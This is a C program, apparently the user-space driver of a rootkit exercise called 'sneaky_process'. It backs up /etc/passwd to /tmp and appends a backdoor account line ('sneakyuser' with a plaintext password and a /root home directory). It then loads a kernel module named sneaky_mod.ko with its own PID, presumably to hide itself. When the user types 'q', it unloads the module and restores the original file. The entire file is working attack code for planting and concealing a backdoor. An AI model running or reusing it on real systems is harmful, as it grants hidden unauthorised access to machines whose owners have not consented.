#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

FILE * open_file(char * path, char * permission){
    FILE * f = fopen(path, permission);
    if(f == NULL){
        printf("Cannot open file \n");
        exit(0);
    } 
    return f;
}

void copy_file(FILE * file1, FILE * file2){
    char c = fgetc(file1);
    while(c != EOF){
        fputc(c, file2);
        c = fgetc(file1);
    }
}

void append_file(FILE * file, const char * str){
    fputs(str, file);
}

void copy_psswd(){
    FILE * passwd_og = open_file("/etc/passwd", "a+");
    FILE * passwd_cp = open_file("/tmp/passwd", "w+");

    copy_file(passwd_og, passwd_cp);
    append_file(passwd_og, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    
    fclose(passwd_og);
    fclose(passwd_cp);
    
}

void copy_back_psswd(){
    FILE * passwd_og = open_file("/etc/passwd", "w+");
    FILE * passwd_cp = open_file("/tmp/passwd", "r+");

    copy_file(passwd_cp, passwd_og);

    fclose(passwd_og);
    fclose(passwd_cp);
    
}



void load_module(int pid){
   char buffer[200];
   snprintf(buffer, sizeof(buffer), "insmod ./sneaky_mod.ko pid=%d", pid);
   system(buffer);
}

int main(void) {
   // display own PID
   int pid = getpid();
   printf("sneaky_process pid = %d\n", pid);
   
   //copy password file 
   copy_psswd();

   //load sneaky module
   load_module(pid);

   //Read user character
   char c;
   scanf("%c", &c);
   while(c != 'q'){
       scanf("%c", &c);
   }

   //unload sneaky module
   system("rmmod ./sneaky_mod.ko");

   //copy back passwd file
   copy_back_psswd();

   return 0;
}